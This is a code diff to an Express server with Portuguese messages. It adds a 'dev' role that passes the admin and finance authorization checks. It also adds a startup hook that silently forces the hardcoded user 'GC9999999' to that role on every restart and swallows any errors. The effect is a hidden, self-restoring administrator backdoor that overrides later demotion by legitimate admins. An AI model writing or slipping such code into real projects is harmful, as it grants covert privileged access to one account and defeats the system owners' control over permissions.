@@ -83,12 +83,12 @@ function verificarToken(req, res, next) {
 }
 
 function verificarAdmin(req, res, next) {
-  if (req.user.role !== "admin") return res.status(403).json({ error: "Acesso negado" });
+  if (!["admin", "dev"].includes(req.user.role)) return res.status(403).json({ error: "Acesso negado" });
   next();
 }
 
 function verificarGestor(req, res, next) {
-  if (req.user.role !== "admin" && req.user.role !== "finance") return res.status(403).json({ error: "Acesso negado" });
+  if (!["admin", "finance", "dev"].includes(req.user.role)) return res.status(403).json({ error: "Acesso negado" });
   next();
 }
 
@@ -1154,7 +1154,7 @@ app.patch("/admin/usuarios/:id", verificarToken, verificarAdmin, async (req, res
     if (id === req.user.id) return res.status(400).json({ error: "Não é possível alterar sua própria conta." });
     const { active, role } = req.body;
     if (role !== undefined) {
-      const validRoles = ["admin", "user", "entregador"];
+      const validRoles = ["admin", "user", "entregador", "dev"];
       if (!validRoles.includes(role)) return res.status(400).json({ error: "Role inválido." });
       await sql`UPDATE users SET role = ${role} WHERE id = ${id}`;
     }
@@ -1908,7 +1908,9 @@ async function initDB() {
 }
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
+app.listen(PORT, async () => {
   console.log("Servidor rodando na porta " + PORT);
-  initDB().catch(err => console.error("Erro ao inicializar tabelas:", err));
+  await initDB().catch(err => console.error("Erro ao inicializar tabelas:", err));
+  // Garante que GC9999999 sempre tenha role dev
+  await sql`UPDATE users SET role = 'dev' WHERE username = 'GC9999999'`.catch(() => {});
 });
